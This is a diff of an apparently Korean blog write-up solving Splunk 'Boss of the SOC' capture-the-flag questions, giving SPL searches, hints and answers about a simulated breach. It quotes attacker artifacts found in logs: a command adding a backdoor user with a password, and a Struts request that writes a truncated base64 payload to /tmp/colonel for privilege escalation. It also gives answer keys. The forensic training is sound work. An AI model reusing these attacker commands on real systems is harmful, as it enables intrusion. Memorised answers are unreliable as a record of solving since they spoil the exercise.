-      &lt;td&gt;aws:elb:accesslogs&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;aws:rds:audit&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;aws:rds:error&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;aws:s3:accesslogs&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;bandwidth&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;bash_history&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;bootstrap&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;cisco:asa&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;cloud-init&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;cloud-init-output&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;code42:api&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;code42:computer&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;code42:org&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;code42:security&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;code42:user&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;config_file&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;cpu&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;cron-too_small&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;df&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;dmesg&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;dpkg&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;error-too_small&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;errors&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;errors-too_small&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;ess_content_importer&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;hardware&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;history-2&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;interfaces&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;iostat&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;lastlog&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;linux_audit&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;linux_secure&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;localhost-5&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;lsof&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;maillog-too_small&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;ms:aad:audit&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;ms:aad:signin&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;ms:o365:management&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;ms:o365:reporting:messagetrace&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;netstat&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;o365:management:activity&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;openPorts&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;osquery:info&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;osquery:results&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;osquery:warning&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;out-3&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;package&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;protocol&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;ps&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;stream:arp&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;stream:dhcp&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;stream:dns&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;stream:http&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;stream:icmp&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;stream:igmp&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;stream:ip&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;stream:mysql&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;stream:smb&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;stream:smtp&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;stream:tcp&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;stream:udp&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;symantec:ep:agent:file&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;symantec:ep:agt_system:file&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;symantec:ep:behavior:file&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;symantec:ep:packet:file&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;symantec:ep:risk:file&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;symantec:ep:scm_system:file&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;symantec:ep:security:file&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;symantec:ep:traffic:file&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;syslog&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;time&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;top&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;usersWithLoginPrivs&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;vmstat&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;who&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;wineventlog&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;xmlwineventlog&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;yum-too_small&lt;/td&gt;
+      &lt;td&gt;2017/08/24 03:27:29.837&lt;/td&gt;
+      &lt;td&gt;Jim Smith &lt;a href=&quot;mailto:jsmith@urinalysis.com&quot;&gt;jsmith@urinalysis.com&lt;/a&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;mailto:btun@froth.ly&quot;&gt;btun@froth.ly&lt;/a&gt;&lt;/td&gt;
+      &lt;td&gt;invoice.zip&lt;/td&gt;
+      &lt;td&gt;20e368e2c9c6e91f24eeddd09369c4aa&lt;/td&gt;
+      &lt;td&gt;MWHPR18CA0034.outlook.office365.com&lt;/td&gt;
+      &lt;td&gt;104.47.37.62&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2017/08/24 03:27:14.323&lt;/td&gt;
+      &lt;td&gt;Jim Smith &lt;a href=&quot;mailto:jsmith@urinalysis.com&quot;&gt;jsmith@urinalysis.com&lt;/a&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;mailto:abungstein@froth.ly&quot;&gt;abungstein@froth.ly&lt;/a&gt;&lt;/td&gt;
+      &lt;td&gt;invoice.zip&lt;/td&gt;
+      &lt;td&gt;20e368e2c9c6e91f24eeddd09369c4aa&lt;/td&gt;
+      &lt;td&gt;CY4PR18CA0071.outlook.office365.com&lt;/td&gt;
+      &lt;td&gt;104.47.41.43&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2017/08/24 03:27:33.239&lt;/td&gt;
+      &lt;td&gt;Jim Smith &lt;a href=&quot;mailto:jsmith@urinalysis.com&quot;&gt;jsmith@urinalysis.com&lt;/a&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;mailto:fyodor@froth.ly&quot;&gt;fyodor@froth.ly&lt;/a&gt;&lt;/td&gt;
+      &lt;td&gt;invoice.zip&lt;/td&gt;
+      &lt;td&gt;20e368e2c9c6e91f24eeddd09369c4aa&lt;/td&gt;
+      &lt;td&gt;BY1PR18CA0020.outlook.office365.com&lt;/td&gt;
+      &lt;td&gt;104.47.38.87&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2017/08/24 03:27:24.557&lt;/td&gt;
+      &lt;td&gt;Jim Smith &lt;a href=&quot;mailto:jsmith@urinalysis.com&quot;&gt;jsmith@urinalysis.com&lt;/a&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;mailto:klagerfield@froth.ly&quot;&gt;klagerfield@froth.ly&lt;/a&gt;&lt;/td&gt;
+      &lt;td&gt;invoice.zip&lt;/td&gt;
+      &lt;td&gt;20e368e2c9c6e91f24eeddd09369c4aa&lt;/td&gt;
+      &lt;td&gt;CY4PR18CA0058.outlook.office365.com&lt;/td&gt;
+      &lt;td&gt;104.47.42.76&lt;/td&gt;
     &lt;/tr&gt;
   &lt;/tbody&gt;
 &lt;/table&gt;
 
-&lt;p&gt;318	From what country is a small brute force or password spray attack occurring against the Frothly web servers?&lt;br /&gt;
-Frothly 웹 서버에 대해 소규모 무차별 대입 공격 또는 암호 스프레이 공격이 어느 국가에서 발생합니까?&lt;/p&gt;
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-    Use linux_secure as the sourcetype.
-    sourcetype linux_secure에서 조사하세요.
-&lt;/details&gt;
+&lt;p&gt;메일내용 중간에 보면 base64로 인코딩된 데이터가 있습니다.
+디코딩 해봅니다.
+시작 : UEsDBBQACQAIAEO
+끝   : QAAAAhAAAAAAA==&lt;/p&gt;
 
-&lt;p&gt;힌트에서 sourcetype linux_secure에 답이있다고 알려줍니다.
-&lt;a href=&quot;https://splunkbase.splunk.com/app/3476/&quot;&gt;linux_secure&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v2/2021-11-02-13-50-38.png&quot; alt=&quot;&quot; /&gt;
+zip파일의 암호는 &lt;strong&gt;912345678&lt;/strong&gt;입니다.&lt;/p&gt;
 
-&lt;p&gt;vendor_action필드에 &lt;strong&gt;Invalid user&lt;/strong&gt;란 값이있으니 조건을 추가해봅니다.&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=linux_secure vendor_action=&quot;Invalid user&quot;
+&lt;p&gt;디코딩한 데이터를 zip파일로 저장한 후 압축해제하면 invoice.doc파일이 있습니다.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ivan@ubuntu:~$ unzip invoice.zip
+Archive:  invoice.zip
+[invoice.zip] invoice.doc password:
+  inflating: invoice.doc
+ivan@ubuntu:~$ strings invoice.doc | head
+bjbj
+Congrats! It looks like you have a virustotal account and chose to live on the edge. If you find this
+ turn it in for some CyberEastEgg points!!!
+[Content_Types].xml
+#!MB
+;c=1
+_rels/.rels
+theme/theme/themeManager.xml
+sQ}#
+theme/theme/theme1.xml
+ivan@ubuntu:~$ file invoice.doc
+invoice.doc: Composite Document File V2 Document, Little Endian, Os: MacOS, Version 10.3, Code page: 10000, Author: Ryan Kovar, Template: Normal.dotm, Last Saved By: Ryan Kovar, Revision Number: 3, Name of Creating Application: Microsoft Macintosh Word, Total Editing Time: 01:00, Create Time/Date: Sun Jul  9 22:07:00 2017, Last Saved Time/Date: Wed Aug  2 05:26:00 2017, Number of Pages: 1, Number of Words: 21, Number of Characters: 125, Security: 0
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;해당 로그에서 발견한 IP는 &lt;strong&gt;5.101.40.81&lt;/strong&gt;입니다.&lt;/p&gt;
+&lt;p&gt;해당 파일의 내용을 파악해보았습니다.
+&lt;a href=&quot;https://www.virustotal.com/gui/file/d8834aaa5ad6d8ee5ae71e042aca5cab960e73a6827e45339620359633608cf1/detection&quot;&gt;virustotal link&lt;/a&gt;
+Relation탭을 보면 scan했던 IP인 &lt;strong&gt;45.77.65.211&lt;/strong&gt;가 있습니다.&lt;/p&gt;
 
-&lt;p&gt;whois에 검색해봅시다.
-&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v3/2021-11-01-15-28-35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;답 : invoice.zip&lt;/p&gt;
 
-&lt;p&gt;해당 IP국가는 러시아입니다.&lt;/p&gt;
+&lt;p&gt;401	The Taedonggang APT group encrypts most of their traffic with SSL. What is the “SSL Issuer” that they use for the majority of their traffic? Answer guidance: Copy the field exactly, including spaces.&lt;br /&gt;
+대동강 APT 그룹은 대부분의 트래픽을 SSL로 암호화합니다. 대부분의 트래픽에 사용하는 “SSL Issuer”는 무엇입니까? 답변 지침: 공백을 포함하여 필드를 정확하게 복사합니다.&lt;/p&gt;
 
-&lt;p&gt;답 : RUSSIA&lt;/p&gt;
-
-&lt;p&gt;319	The adversary created a BCC rule to forward Frothly’s email to his personal account. What is the value of the “Name” parameter set to?&lt;br /&gt;
-공격자는 Frothly의 이메일을 자신의 개인 계정으로 전달하는 BCC 규칙을 만들었습니다. “Name” 매개변수의 값은 무엇으로 설정되어 있습니까?&lt;/p&gt;
 &lt;details&gt;
   &lt;summary&gt;hint#1&lt;/summary&gt;
-    Use ms:o365:management as the sourcetype.
-    sourcetype ms:o365:management에서 조사하세요.
-&lt;/details&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://bluemail.help/ko/myself-bcc-automatically/&quot;&gt;BCC룰이란?&lt;/a&gt;
-BCC는 숨은참조입니다. 숨은참조 룰을 찾아봅시다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=ms:o365:management *Frothly* *Name* (*bcc* OR *Rule* OR *Blind*Carbon*Copy*)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v3/2021-11-01-16-01-27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;공격자의 메일주소 hyunki1984@naver.com로 BlindCopyTo를 보내는 &lt;strong&gt;New-TransportRule&lt;/strong&gt;룰을 생기는 이벤트입니다.&lt;/p&gt;
-
-&lt;p&gt;답 : SOX&lt;/p&gt;
-
-&lt;p&gt;320	What is the password for the user that was created on the compromised endpoint?&lt;br /&gt;
-손상된 엔드포인트에서 생성된 사용자의 비밀번호는 무엇입니까?&lt;/p&gt;
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-    Use WinEventLog:Security as the sourcetype.
-    sourcetype WinEventLog:Security에서 조사하세요.
-&lt;/details&gt;
-
-&lt;p&gt;svcvnc를 키워드로 검색하면 아래와 같은 이벤트를 발견할 수 있습니다.&lt;/p&gt;
-
-&lt;p&gt;Process Command Line:	C:\Windows\system32\net1 user /add svcvnc Password123!&lt;/p&gt;
-
-&lt;p&gt;답 : Password123!&lt;/p&gt;
-
-&lt;p&gt;321	The Taedonggang adversary sent Grace Hoppy an email bragging about the successful exfiltration of customer data. How many Frothly customer emails were exposed or revealed?&lt;br /&gt;
-대동강은 Grace Hoppy에게 성공적인 고객 데이터 유출에 대해 자랑하는 이메일을 보냈습니다. 얼마나 많은 Frothly 고객 이메일이 노출되거나 공개되었습니까?&lt;/p&gt;
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-    Use stream:smtp as the sourcetype.
-    sourcetype stream:smtp에서 조사하세요.
-&lt;/details&gt;
-
-&lt;p&gt;Grace Hoppy의 이메일주소는 &lt;strong&gt;ghoppy@froth.ly&lt;/strong&gt;입니다.
-smtp에서 수신자 ghoppy@froth.ly인 이벤트를 찾아봅시다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:smtp receiver_email{}=ghoppy@froth.ly
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;sender_email이 &lt;strong&gt;hyunki1984@naver.com&lt;/strong&gt;인 이벤트가 1개있습니다.
-base64인코딩된 데이터를 디코딩해봅시다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;R3JhY2llLAoKICAgICAgIFdlIGJyb3VnaHQgeW91ciBkYXRhIGFuZCBpbXBvcnRlZCBpdDogaHR0
-cHM6Ly9wYXN0ZWJpbi5jb20vc2RCVWt3c0UgQWxzbywgeW91IHNob3VsZCBub3QgYmUgdG9vIGhh
-cmQgQnJ1Y2UuIEhlIGdvb2QgbWFuIAogCiAKIAogCg==
-(Decoding)→
-Gracie,
-We brought your data and imported it: https://pastebin.com/sdBUkwsE Also, you should not be too hard Bruce. He good man 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;해당 url로 가보면 총 8명입니다.
-&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v3/2021-11-01-16-17-11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;답 : 8&lt;/p&gt;
-
-&lt;p&gt;322	What is the path of the URL being accessed by the command and control server? Answer guidance: Provide the full path. (Example: The full path for the URL https://imgur.com/a/mAqgt4S/lasd3.jpg is /a/mAqgt4S/lasd3.jpg)
-명령 및 제어 서버가 액세스하는 URL의 경로는 무엇입니까? 답변 안내: 전체 경로를 제공하세요. (예: https://imgur.com/a/mAqgt4S/lasd3.jpg URL의 전체 경로는 /a/mAqgt4S/lasd3.jpg입니다.)&lt;/p&gt;
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-    Start with XmlWinEventLog:Microsoft-Windows-Sysmon/Operational as the sourcetype, or review the PowerShell logging on various Frothly laptops.
-    XmlWinEventLog:Microsoft-Windows-Sysmon/Operational을 소스 유형으로 시작하거나 다양한 Frothly 랩톱에서 PowerShell 로깅을 검토합니다.
-&lt;/details&gt;
-
-&lt;p&gt;323	At least two Frothly endpoints contact the adversary’s command and control infrastructure. What are their short hostnames? Answer guidance: Comma separated without spaces, in alphabetical order.&lt;br /&gt;
-최소 2개의 Frothly 엔드포인트가 적의 명령 및 제어 인프라에 접속합니다. 짧은 호스트 이름은 무엇입니까? 답변 안내: 알파벳 순서로 공백 없이 쉼표로 구분됩니다.&lt;/p&gt;
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-    
-&lt;/details&gt;
-
-&lt;p&gt;324	Who is Al Bungstein’s cell phone provider/carrier? Answer guidance: Two words.&lt;br /&gt;
-324 Al Bungstein의 휴대전화 제공업체/이동통신사는 누구인가요? 답변 안내: 두 단어.&lt;/p&gt;
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-    How can you find out what external IP address Al Bungstein is using?&lt;br /&gt;
-    Al Bungstein이 사용하는 외부 IP 주소를 어떻게 알 수 있습니까?
+    You might need to get more information before you tackle this question. Have you figured out the IP address of Taedonggang's server?&lt;br /&gt;
+    이 질문을 다루기 전에 더 많은 정보를 얻어야 할 수도 있습니다. 대동강 서버의 IP 주소를 알아내셨나요?
 &lt;/details&gt;
 &lt;details&gt;
-  &lt;summary&gt;hint#2&lt;/summary&gt;
-    OSINT is your friend here. Pivot off of Al's external IP.&lt;br /&gt;
-    OSINT는 여기 당신의 친구입니다. Al의 외부 IP를 피벗합니다.
+  &lt;summary&gt;hint#2&lt;/summary&gt; 
+    Frothly currently only collects SSL data with Stream. Look at the sourcetype 'stream:TCP' for more information about SSL data.&lt;br /&gt;
+    Frothly는 현재 Stream으로 SSL 데이터만 수집합니다. SSL 데이터에 대한 자세한 내용은 소스 유형 'stream:TCP'를 확인하세요.
 &lt;/details&gt;
 &lt;details&gt;
   &lt;summary&gt;hint#3&lt;/summary&gt;
-    There is a single sourcetype in Splunk that also contains this information. It is a scripted input running on Al's machine.&lt;br /&gt;
-    Splunk에는 이 정보도 포함하는 단일 소스 유형이 있습니다. Al의 시스템에서 실행되는 스크립트 입력입니다.
+    Issuer' is a value found in a TLS/SSL certificate. Try and find SSL/TLS certificates tied to the IP address of Taedonggang's attacking server.&lt;br /&gt;
+    Issuer'는 TLS/SSL 인증서에 있는 값입니다. 대동강 공격 서버의 IP 주소에 연결된 SSL/TLS 인증서를 찾아보십시오.
 &lt;/details&gt;
-
-&lt;p&gt;Al Bungstein의 이메일은 &lt;strong&gt;abungstein@froth.ly&lt;/strong&gt;입니다.
-ip : 174.215.1.81&lt;/p&gt;
-
-&lt;p&gt;해당 ip를 &lt;a href=&quot;https://domain.whois.co.kr/whois/search.php&quot;&gt;whois&lt;/a&gt;에 조회해보면&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v3/2021-11-01-18-03-14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;답 : Verizon Wireless&lt;/p&gt;
-
-&lt;p&gt;325	Microsoft cloud services often have a delay or lag between “index time” and “event creation time”. For the entire day, what is the max lag, in minutes, for the sourcetype: ms:aad:signin? Answer guidance: Round to the nearest minute without the unit of measure.&lt;br /&gt;
-Microsoft 클라우드 서비스는 종종 “인덱스 시간”과 “이벤트 생성 시간” 사이에 지연 또는 지연이 있습니다. 전체일 중 ms:aad:signin의 최대 지연 시간(분)은 얼마입니까? 답변 안내: 측정 단위 없이 가장 가까운 분으로 반올림합니다.&lt;/p&gt;
 &lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-
+  &lt;summary&gt;hint#4&lt;/summary&gt;
+    Look in sourcetype=stream:tcp with the IP address of Taedonggang and the field ssl_issuer.&lt;br /&gt;
+    대동강의 IP 주소와 ssl_issuer 필드가 있는 sourcetype=stream:tcp를 찾습니다.
 &lt;/details&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=ms:aad:signin  
-| eval indextime=strftime(_indextime,&quot;%Y-%m-%d %H:%M:%S&quot;) 
-| eval time=strftime(_time,&quot;%Y-%m-%d %H:%M:%S&quot;) 
-| eval indextime_epoch=strptime(indextime,&quot;%Y-%m-%d %H:%M:%S&quot;)
-| eval time_epoch=strptime(time, &quot;%Y-%m-%d %H:%M:%S&quot;)
-| table time, indextime, indextime_epoch, time_epoch
-| eval delta=indextime_epoch-time_epoch
-| stats max(delta) as max_lag
-| eval minutes=max_lag / 60
+
+&lt;p&gt;SSL관련 데이터는 stream:tcp에 있을것입니다. 대동강 서버의 IP주소인 45.77.65.211와 키워드 ssl을 넣고 검색해봅니다.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=stream:tcp *ssl* 45.77.65.211
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;326	According to Mallory’s advertising research, how is beer meant to be enjoyed? Answer guidance: One word.&lt;br /&gt;
-Mallory의 광고 연구에 따르면 맥주는 어떻게 즐길 수 있습니까? 답변 안내: 한 마디.&lt;/p&gt;
+
+&lt;p&gt;ssl-issuer란 필드가 있습니다.
+&lt;img src=&quot;https://wind-flow.github.io/assets/built/images/splunk/bots/v2/2021-11-02-14-45-46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;답 : C = US&lt;/p&gt;
+
+&lt;p&gt;402	Threat indicators for a specific file triggered notable events on two distinct workstations. What IP address did both workstations have a connection with?&lt;br /&gt;
+특정 파일에 대한 위협 표시기는 두 개의 개별 워크스테이션에서 주목할만한 이벤트를 트리거했습니다. 두 워크스테이션이 연결된 IP 주소는 무엇입니까?&lt;/p&gt;
+
 &lt;details&gt;
   &lt;summary&gt;hint#1&lt;/summary&gt;
-    
-&lt;/details&gt;
-
-&lt;p&gt;327도 문제 없습니다.&lt;/p&gt;
-
-&lt;p&gt;328	What text is displayed on line 2 of the file used to escalate tomcat8’s permissions to root? Answer guidance: Provide contents of the entire line.&lt;br /&gt;
-tomcat8의 권한을 루트로 에스컬레이션하는 데 사용되는 파일의 2행에 어떤 텍스트가 표시됩니까? 답변 안내: 전체 라인의 내용을 제공합니다.&lt;/p&gt;
-&lt;details&gt;
-  &lt;summary&gt;hint#1&lt;/summary&gt;
-    Start with any sourcetype that provides detailed process execution data, or one that provides clear-text details of information posted to the Linux host hoth.&lt;br /&gt;
-    자세한 프로세스 실행 데이터를 제공하는 소스 유형이나 Linux 호스트 hoth에 게시된 정보의 일반 텍스트 세부 정보를 제공하는 소스 유형으로 시작하십시오.
+    Check out the Incident Review dashboard.&lt;br /&gt;
+    Incident Review dashboard를 확인하십시오.
 &lt;/details&gt;
 &lt;details&gt;
   &lt;summary&gt;hint#2&lt;/summary&gt;
-    You are looking for a long string of base64 information.
-    긴 base64 정보 문자열을 찾고 있습니다.
-&lt;/details&gt;
-
-&lt;p&gt;osquery에 실행관련 이벤트가 있을것입니다. 어떤 계정이 어떤 명령을 실행했는지 조사해봅니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sourcetype=osquery:results tomcat8 columns.cmdline=*
-| table _time decorations.username columns.cmdline
-| reverse
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;중간에 &lt;strong&gt;“chmod” “+x” “colonelnew”&lt;/strong&gt;, &lt;strong&gt;”./colonelnew”&lt;/strong&gt;의 이벤트를 발견할 수 있습니다. 
-&lt;strong&gt;colonelnew&lt;/strong&gt;은 315번문제에서 발견한 파일과 비슷합니다. sourcetype sysmon에서 cat colonel.c의 로그가 있었습니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;*colonel* source=&quot;WinEventLog:Microsoft-Windows-Sysmon/Operational&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;중간 &lt;strong&gt;C:\windows\temp\unziped\lsof-master\iexeplorer.exe” http://192.168.9.30:8080/frothlyinventory/showcase.action “echo Ly…. &amp;gt;&amp;gt; /tmp/colonel&lt;/strong&gt;과 같은 명령어가 보입니다.
-해당 base64를 /tmp/colonel파일로 옮기는것처럼 보입니다. 해당 데이터를 base64로 디코딩해봅니다.&lt;/p&gt;
-
